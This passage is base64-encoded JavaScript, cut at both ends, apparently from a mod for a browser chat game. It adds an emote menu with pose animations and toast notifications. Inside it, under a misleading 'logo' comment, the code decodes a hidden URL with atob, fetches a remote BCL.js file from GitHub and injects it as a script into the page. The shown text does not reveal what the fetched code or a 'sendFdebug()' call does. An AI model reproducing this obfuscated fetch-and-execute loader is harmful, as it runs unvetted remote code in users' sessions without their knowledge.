JUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDYwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA3MDAwKTsgfSB9LAogIHsgbmFtZTogIkp1bXBpbmcgSmFja3MiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICBIZWlnaHQ6IDE1MAogICAgICAgICAgfTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHVuZGVmaW5lZDsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAyMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgIEhlaWdodDogMTUwCiAgICAgICAgICB9OwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDMwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA0MDAwKTsgICAgIH0gfSwKICB7IG5hbWU6ICJCdXJwZWVzIiwgYWN0aW9uOiAoKSA9PiB7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIkhvZ3RpZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgIAogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJIb2d0aWVkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDUwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA2MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNzAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDgwMDApOyB9IH0sCiAgeyBuYW1lOiAiU2xlZXAiLCBhY3Rpb246ICgpID0+IHsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiSG9ndGllZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRXllcyIsICJDbG9zZWQiKTsKICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIkV5ZXMyIiwgIkNsb3NlZCIpOwogIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiRW1vdGljb24iLCAiU2xlZXAiKTsKICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOyAgfSB9Cl07Cgpjb25zdCBidXR0b25Db250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLndpZHRoID0gIjMwMHB4IjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLmhlaWdodCA9ICIzMDBweCI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS5sZWZ0ID0gIjUwJSI7CmJ1dHRvbkNvbnRhaW5lci5zdHlsZS50b3AgPSAiNTAlIjsKYnV0dG9uQ29udGFpbmVyLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKY29uc3QgYnV0dG9uQ2lyY2xlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CmJ1dHRvbkNpcmNsZS5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS53aWR0aCA9ICIyMDBweCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5oZWlnaHQgPSAiMjAwcHgiOwpidXR0b25DaXJjbGUuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwpidXR0b25DaXJjbGUuc3R5bGUub3BhY2l0eSA9ICIxIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLmxlZnQgPSAiNTAlIjsKYnV0dG9uQ2lyY2xlLnN0eWxlLnRvcCA9ICI1MCUiOwpidXR0b25DaXJjbGUuc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNpcmNsZS5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbkNpcmNsZS5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkIGJsYWNrIjsKCmJ1dHRvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChidXR0b25DaXJjbGUpOwpjb25zdCBsb2dvID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CmxvZ28uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CmxvZ28uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpsb2dvLnN0eWxlLndpZHRoID0gIjgwcHgiOwpsb2dvLnN0eWxlLmhlaWdodCA9ICI4MHB4IjsKbG9nby5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKbG9nby5zdHlsZS5sZWZ0ID0gIjUwJSI7CmxvZ28uc3R5bGUudG9wID0gIjUwJSI7CmxvZ28uc3R5bGUudHJhbnNmb3JtID0gInRyYW5zbGF0ZSgtNTAlLCAtNTAlKSI7CmJ1dHRvbkNpcmNsZS5hcHBlbmRDaGlsZChsb2dvKTsKY29uc3QgYnV0dG9ucyA9IFtdOwpmb3IgKGxldCBpID0gMDsgaSA8IGJ1dHRvbkRhdGEubGVuZ3RoOyBpKyspIHsKICBjb25zdCBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICBidXR0b24uaW5uZXJUZXh0ID0gYnV0dG9uRGF0YVtpXS5uYW1lOwogIGJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgYnV0dG9uLnN0eWxlLndpZHRoID0gIjgwcHgiOwogIGJ1dHRvbi5zdHlsZS5oZWlnaHQgPSAiODBweCI7CiAgYnV0dG9uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogIGJ1dHRvbi5zdHlsZS5jb2xvciA9ICJ3aGl0ZSI7CiAgYnV0dG9uLnN0eWxlLmJveFNoYWRvdyA9ICIwIDJweCA1cHggcmdiYSgwLCAwLCAwLCAwLjMpIjsKICBidXR0b24uc3R5bGUubGVmdCA9ICI1MCUiOwogIGJ1dHRvbi5zdHlsZS50b3AgPSAiNTAlIjsKICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtMTAwcHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpYDsKICBidXR0b24uc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuMnMgZWFzZS1pbi1vdXQsIHRyYW5zZm9ybSAwLjJzIGVhc2UtaW4tb3V0IjsKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBidXR0b25EYXRhW2ldLmFjdGlvbik7CiAgYnV0dG9uQ29udGFpbmVyLmFwcGVuZENoaWxkKGJ1dHRvbik7CiAgYnV0dG9ucy5wdXNoKGJ1dHRvbik7CgogIGJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgKCkgPT4gewogICAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTk5cHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHNjYWxlKDEuMDUpYDsKICB9KTsKCiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCAoKSA9PiB7CiAgICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtMTAwcHgpIHJvdGF0ZSgkey1pICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHNjYWxlKDEpYDsKICB9KTsKfQoKCgpsZXQgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIChldmVudCkgPT4gewppZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICBpc0dyYXZlS2V5RG93biA9IHRydWU7Cn0gZWxzZSBpZiAoaXNHcmF2ZUtleURvd24gJiYgZXZlbnQua2V5ID09PSAiZSIpIHsKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIGlzR3JhdmVLZXlEb3duID0gZmFsc2U7Cn0KfSk7CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgKGV2ZW50KSA9PiB7CmlmIChldmVudC5rZXkgPT09ICJgIikgewogIGlzR3JhdmVLZXlEb3duID0gZmFsc2U7Cn0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIChldmVudCkgPT4gewogIGlmICghYnV0dG9uQ29udGFpbmVyLmNvbnRhaW5zKGV2ZW50LnRhcmdldCkpIHsKICAgIGlmIChidXR0b25Db250YWluZXIucGFyZW50Tm9kZSA9PT0gZG9jdW1lbnQuYm9keSkgewogICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgICB9CiAgICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9Cn0pOwoKLy9FbmQgT2YgRW1vdGUgTWVudSBfX19fX19fX19fX19fX19fX18KCi8vRU5EIE9GIENPTlRFWFQgTUVOVSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKLy9CQ01FIExPR08gT24gQ2hhcmFjdGVyCmZldGNoKGF0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDBKRFRWTTNMMEpEVFM5dFlXbHVMMEpEVEM1cWN3PT0nKSkKLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQoudGhlbih0ZXh0ID0+IHsKY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5pbm5lckhUTUwgPSB0ZXh0Owpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7Cn0pCgoKZnVuY3Rpb24gc2hvd1RvYXN0c2NwZygpIHsKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwogICAgfQogIH0KICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjNENBRjUwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwpzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwogICAgCnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJBY3Rpb24gU3VjY2Vzc2Z1bGx5IEV4ZWN1dGVkIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICB9LCAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB9LCA1MDAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9LCA1NTAwKTsKICAgIHNlbmRGZGVidWcoKTsKCiAgfQogIAoKLy9UaGUgVXBkYXRlIHRvYXN0CmZ1bmN0aW9uIHNob3dUb2FzdFVwZGF0ZSgpIHsKdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwp9LCAwKTsKCnZhciBjbG9zZUJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwpjbG9zZUJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLmJhY2tncm91bmQgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLnRvcCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5yaWdodCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250U2l6ZSA9ICIxNnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luTGVmdCA9ICItMnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luUmlnaHQgPSAiMHB4IjsKY2xvc2VCdXR0b24uaW5uZXJIVE1MID0gIlgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaG